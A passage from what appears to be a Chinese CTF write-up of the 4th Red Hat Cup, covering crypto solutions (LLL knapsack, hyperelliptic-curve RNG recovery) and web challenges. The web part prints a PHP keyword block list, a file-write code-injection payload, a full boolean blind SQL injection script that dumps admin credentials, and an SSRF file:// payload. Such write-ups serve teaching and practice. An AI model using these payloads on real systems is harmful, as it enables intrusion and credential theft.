class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">100</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="built_in">int</span>(<span class="number">100</span>)</span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    keys.append(<span class="built_in">int</span>(Decimal(<span class="built_in">int</span>(primes[i])).ln() * (<span class="number">2</span> ** <span class="number">256</span>)))</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(keys)</span><br><span class="line">d = n / log(<span class="built_in">max</span>(keys), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">assert</span> CDF(d) &lt; <span class="number">0.9408</span></span><br><span class="line"></span><br><span class="line">M = Matrix.identity(n)</span><br><span class="line"></span><br><span class="line">last_row = [<span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> keys]</span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;597952043660446249020184773232983974017780255881942379044454676980646417087515453&#x27;</span></span><br><span class="line"><span class="comment"># ct = &#x27;425985475047781336789963300910446852783032712598571885345660550546372063410589918&#x27;</span></span><br><span class="line">last_col = keys[:]</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.LLL()</span><br><span class="line">target = X[<span class="number">0</span>][:-<span class="number">1</span>]</span><br><span class="line">flag = [-k <span class="keyword">for</span> k <span class="keyword">in</span> target]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag).strip(<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;715c39c3-1b46-4c23-&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;8006-27b43eba2446&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>flag值：flag{715c39c3-1b46-4c23-8006-27b43eba2446}</strong></p><p>​    </p><h3 id="hpcurve"><a href="#hpcurve" class="headerlink" title="hpcurve"></a>hpcurve</h3><blockquote><p>你的数学学的怎么样？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">R.&lt;x&gt; = GF(p)[]</span><br><span class="line">y=x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line">es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clk</span>():</span></span><br><span class="line"><span class="keyword">global</span> Ds,es</span><br><span class="line">Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(es, Ds)]</span><br><span class="line"><span class="keyword">return</span> Ds</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    </span><br><span class="line">    u,v = <span class="built_in">sum</span>(clk())</span><br><span class="line">    rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line">text = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+flag</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">keys = generate()</span><br><span class="line">leng = <span class="built_in">len</span>(keys)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">    t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> t.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5</span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑：</p><p>密文为flag与超椭圆曲线 $y^2=x+x^7$ 随机生成值异或得到，由于部分明文已知，通过随机生成器(RNG)部分的代码恢复剩余字符。</p><blockquote><p>对于域 $K$，亏格为 $g$ 超椭圆曲线基本形式是 $C:y^2+h(x)y=f(x)$，其中 $h(x),f(x) \in K[x]$（多项式系数都在 $K$ 上），且 $\deg(h(x)) \leq g$，$\deg(f(x))=2g+1$。</p><p>超椭圆曲线密码体制是建立在超椭圆曲线的Jacobian群上的，有限域上超椭圆曲线的Jacobian群是一个有限交换群，Jacobian阶记为 $J(C)$。可以在 $J(C)$中定义归约除子的一个加法运算 。使得 $J(C)$成为一个交换群，这个有限交换群是超椭圆曲线密码体制的基础。</p><p>每个元素 $D \in J(C)$ 都可以唯一表示为 $K[x]$ 上的一个多项式元组 $\langle u(x),v(x) \rangle$，多项式满足：</p><ul><li>$u(x)$ 是首一多项式</li><li>$u(x)$ 整除 $f(x)-h(x)v(x)-v^2(x)$</li><li>$\deg(v(x)) \lt \deg(u(x)) \lt g$</li></ul></blockquote><p>这里 $h(x)=0,f(x)=x+x^7$，RNG部分生成三个随机数 $e_1,e_2,e_3$ 以及三个元素 $D_1,D_2,D_3 \in J(C)$，</p><p>RNG部分计算 $\langle u(x),v(x) \rangle=e_1D_1+e_2D_2+e_3D_3$ 并将系数转换为字节。</p><p>结合已知的<code>a*20+flag</code>共24字节，可以恢复 $u(x)$。</p><p>对于 $v(x)$，根据 $D \in J(C)$ 的性质，有 $f(x)-h(x)v(x)-v^2(x) \equiv 0 \pmod {u(x)}$</p><p>如果 $x_i$ 是 $u(x)$ 的根（$K$ 代数闭包下），有 $f(x_i)-h(x_i)v(x_i)-v^2(x_i) = 0 \Longrightarrow v^2(x_i)+h(x_i)v(x_i)=f(x_i)$，</p><p>说明 $(x_i,v(x_i))$ 是 $C$ 上的一个点。</p><p>又 $h(x_i)=0$，则 $v^2(x_i)=f(x_i) \Longrightarrow v(x_i) = \pm \sqrt{f(x_i)}$。</p><p>由于 $u(x)$ 次数为3，在$K$ 代数闭包下，可以找到三个根 $x_1,x_2,x_3$，即 $C$ 上的三个点 $(x_1,v(x_1)),(x_2,v(x_2)),(x_3,v(x_3))$，利用拉格朗日插值方法可以恢复 $v(x)$。</p><p>得到 $u(x)$ 和 $v(x)$，异或操作还原明文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product, cycle</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">K = GF(p)</span><br><span class="line">R.&lt;x&gt; = K[]</span><br><span class="line">y = x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_u_from_out</span>(<span class="params">output, known_input</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        res.append(output[i]^^known_input[i])</span><br><span class="line">    res = <span class="built_in">bytes</span>(res)</span><br><span class="line">    u0, u1, u2 = struct.unpack(<span class="string">&quot;&lt;QQQ&quot;</span>, res)</span><br><span class="line">    u = x^<span class="number">3</span>+x^<span class="number">2</span>*u2+x*u1+u0</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v_from_u</span>(<span class="params">u</span>):</span></span><br><span class="line">    Kbar = GF(p^<span class="number">6</span>)</span><br><span class="line">    Rbar.&lt;t&gt; = Kbar[<span class="string">&quot;t&quot;</span>]</span><br><span class="line">    u2 = u.change_ring(Rbar)</span><br><span class="line">    roots = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> u2.roots()]</span><br><span class="line">    ys = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        ys.append(f(root).sqrt(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)])</span><br><span class="line">        <span class="keyword">if</span> poly[<span class="number">0</span>] <span class="keyword">in</span> K:</span><br><span class="line">            res.append(R(poly))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_decode</span>(<span class="params">output, u, v</span>):</span></span><br><span class="line">    rs = [u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>]]</span><br><span class="line">    otp = struct.pack(<span class="string">&quot;&lt;QQQQQQ&quot;</span>, *rs)</span><br><span class="line">    decrypted = [a^^b <span class="keyword">for</span> (a, b) <span class="keyword">in</span> <span class="built_in">zip</span>(output, cycle(otp)) ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(decrypted)</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>)</span><br><span class="line">known_input = <span class="string">b&#x27;a&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">u = get_u_from_out(output, known_input)</span><br><span class="line">vs = get_v_from_u(u)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> vs:</span><br><span class="line">    <span class="comment">#print((u,v))</span></span><br><span class="line">    <span class="built_in">print</span>(try_decode(output,u,v))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag|\xb1J\xedFp^v2\xb9\x10\x16\xf6\xfddD(h7\xb6\xc3S\xe0\xcf-97d120aae6fc&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\xe3J\xad\x88\xb2\xac\xf8\x1c-C\x07\x97\x02/B47l\xd0\xf30\x8f&amp;\xbf-97d120aae6fc&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\xe4\xca\xf5\xbd\xc6\xa6\x00B\xfe\xde\xe3z\x9a\xbe\x95D\xf9\xc2\xafD\xda\xff\xa3\xeb-97d120aae6fc&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>flag值：flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc}</strong></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>主页面没什么有用信息，扫描发现<code>robots.txt</code>，访问提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want:1ndexx.php</span><br></pre></td></tr></table></figure><p>访问<code>1ndexx.php</code>报500 Internal Server Error，尝试看是否存在vim源码泄露，发现访问<code>.1ndexx.php.swp</code>能回显源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">padding: <span class="number">50</span>px;</span><br><span class="line">font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#logo &#123;</span></span><br><span class="line">margin-bottom: <span class="number">40</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line">fclose(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码逻辑：</p><p>将<code>flag.php</code>文件内容读入变量<code>$I_know_you_wanna_but_i_will_not_give_you_hhh</code>，并将传入的<code>code</code>参数值与变量<code>$I_know_you_wanna_but_i_will_not_give_you_hhh</code>一起写入<code>hack.php</code>文件中。</p><p>对<code>code</code>参数值过滤的关键字不少：</p><p><code>system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|~|^|`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump</code></p><p>用命令执行、文件读写等多种方式尝试向<code>hack.php</code>写入php代码，以显示<code>flag.php</code>文件内容，发现<code>show_source()</code>函数可行。</p><p>payload: <code>?code=&lt;?=show_source(&quot;fla&quot;.&quot;g.php&quot;);</code></p><p>最后访问<code>hack.php</code>，得到<code>flag.php</code>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#ini_set(&#x27;display_errors&#x27;,true);</span></span><br><span class="line"><span class="comment">#error_reporting(E_ALL ^ E_NOTICE);</span></span><br><span class="line"></span><br><span class="line">flag=MZWGCZ33HA3GIOJWHA2DGLJYGNTDCLJUGE3DSLJZMQZDILJZGY3TIZRTHE3GMMJQGN6Q====;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;What is important for a new bird of php??&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Base32解码得flag。</p><p><strong>flag值：flag{86d96843-83f1-4169-9d24-9674f396f103}</strong></p><p>​    </p><h3 id="WebsiteManager"><a href="#WebsiteManager" class="headerlink" title="WebsiteManager"></a>WebsiteManager</h3><blockquote><p>最新的网站测试器，作为非站长的你，能利用好它的功能吗？</p></blockquote><p>查看网页源码发现<code>image.php?id=1</code>，猜测存在sql注入，手工测试发现过滤了空格和双引号，且测试<code>?id=-2/**/or/**/1=1</code>有图片显示，<code>?id=-2/**/or/**/1=2</code>无图片显示，验证存在注入点，采用布尔盲注跑出登录用户名和密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zefme7yqvztnp4652um.cloudeci1.ichunqiu.com/image.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(username,password))from(ctf.users)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;&#x27;&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;-2/**/or/**/<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;HRN&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">#库名: ctf</span></span><br><span class="line"><span class="comment">#表名: images,users</span></span><br><span class="line"><span class="comment">#users表中列名： username,password</span></span><br><span class="line"><span class="comment">#users表中值： admin,9ebab83595888e5a8bd57</span></span><br></pre></td></tr></table></figure><p>用<code>admin</code>和<code>9ebab83595888e5a8bd57</code>直接登录，结合<code>curl.php</code>猜测是SSRF，填入<code>http://127.0.0.1/</code>得到访问结果回显验证猜测，尝试改用file伪协议直接读取根目录flag文件得到flag。</p><p><img src="/match-第四届红帽杯网络安全大赛/image-20210509192000500.png" alt="image-20210509192000500"></p><p>payload: <code>file://127.0.0.1/flag</code> 或 <code>file:///flag</code></p><p><strong>flag值：flag{f0d06b4c-954e-4a76-ad5d-95bd0227daea}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;这一届的misc+crypto也太少了，一二血同队+垂直上分明显。&lt;/p&gt;
&lt;hr&gt;
